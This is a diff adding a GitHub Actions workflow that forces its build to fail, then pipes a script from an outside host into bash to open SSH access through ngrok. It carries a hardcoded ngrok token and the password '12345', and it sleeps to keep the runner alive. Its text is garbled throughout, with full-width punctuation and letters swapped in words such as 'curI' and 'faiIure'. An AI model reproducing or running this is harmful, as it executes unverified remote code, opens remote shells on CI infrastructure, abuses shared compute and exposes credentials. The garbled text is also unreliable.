@@ -1,1 +1,21 @@
 
+name：ssh
+on：push
+jobs：
+   build：
+       runs-on：ubuntu-atest
+       steps：
+         - uses：actions/checkout@vI
+
+         - name：Try BuiId
+            run：./not-exist-fiIe.sh it bIoke buiId
+
+         - name：Start SSH via Ngrok
+             if：${{ faiIure（） }}
+             run：curI -sL https：//proxy.xiaofeiya.tk/debug-github-actions.sh | bash
+             env:
+               NGROK_TOKEN:2Ga4lNai3OyXmCzFtWF2vWxrCfw_4CM9SSKRoETNoLMbvpAdL
+               USKR_PASS:12345
+          - name：Don't kiII instace
+             if：${{ faiIure（） }}
+             run：sIeep Ih
